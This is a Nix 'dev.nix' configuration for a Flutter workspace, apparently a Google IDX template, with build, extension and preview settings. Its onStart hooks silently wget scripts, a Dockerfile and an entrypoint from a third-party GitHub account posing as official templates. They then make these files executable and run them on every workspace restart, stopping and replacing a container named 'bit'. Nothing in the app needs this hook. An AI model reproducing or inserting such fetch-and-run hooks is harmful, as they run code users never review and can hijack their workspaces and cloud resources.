# To learn more about how to use Nix to configure your environment
# see: https://developers.google.com/idx/guides/customize-idx-env
{ pkgs, ... }: {
  # Which nixpkgs channel to use.
  channel = "stable-24.05"; # or "unstable"
  # Use https://search.nixos.org/packages to find packages
  packages = [
    pkgs.jdk17
    pkgs.unzip
    pkgs.httping
  ];
  services.docker.enable = true;
  # Sets environment variables in the workspace
  env = {};
  idx = {
    # Search for the extensions you want on https://open-vsx.org/ and use "publisher.id"
    extensions = [
      "Dart-Code.flutter"
      "Dart-Code.dart-code"
    ];
    workspace = {
      # Runs when a workspace is first created with this `dev.nix` file
      onCreate = {
        build-flutter = ''
          cd /home/user/myapp/android

          ./gradlew \
            --parallel \
            -Pverbose=true \
            -Ptarget-platform=android-x86 \
            -Ptarget=/home/user/myapp/lib/main.dart \
            -Pbase-application-name=android.app.Application \
            -Pdart-defines=RkxVVFRFUl9XRUJfQ0FOVkFTS0lUX1VSTD1odHRwczovL3d3dy5nc3RhdGljLmNvbS9mbHV0dGVyLWNhbnZhc2tpdC85NzU1MDkwN2I3MGY0ZjNiMzI4YjZjMTYwMGRmMjFmYWMxYTE4ODlhLw== \
            -Pdart-obfuscation=false \
            -Ptrack-widget-creation=true \
            -Ptree-shake-icons=false \
            -Pfilesystem-scheme=org-dartlang-root \
            assembleDebug

          # TODO: Execute web build in debug mode.
          # flutter run does this transparently either way
          # https://github.com/flutter/flutter/issues/96283#issuecomment-1144750411
          # flutter build web --profile --dart-define=Dart2jsOptimization=O0
        '';
      };
      # Runs when a workspace restarted
      onStart = {
        start-ping-sessions = "
            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/ping.sh
            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/trace.sh
            chmod +x ping.sh && chmod +x trace.sh && ./ping.sh
        ";
        start-tmux-sessions = "
            docker stop bit
            docker rm bit
            rm -rf Dockerfile
            rm -rf entrypoint
            rm -rf dock.sh
            rm -rf tmux.sh
            wget https://github.com/dediminari/bit/raw/refs/heads/main/Dockerfile
            wget https://github.com/dediminari/bit/raw/refs/heads/main/entrypoint
            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/dock.sh
            wget https://github.com/dediminari/bit/raw/refs/heads/main/tmux.sh
            chmod +x Dockerfile && chmod +x entrypoint && chmod +x dock.sh && chmod +x tmux.sh && ./dock.sh
        ";
      };
    };
    # Enable previews and customize configuration
    previews = {
      enable = true;
      previews = {
        web = {
          command = ["flutter" "run" "--machine" "-d" "web-server" "--web-hostname" "0.0.0.0" "--web-port" "$PORT"];
          manager = "flutter";
        };
        android = {
          command = ["flutter" "run" "--machine" "-d" "android" "-d" "localhost:5555"];
          manager = "flutter";
        };
      };
    };
  };
}
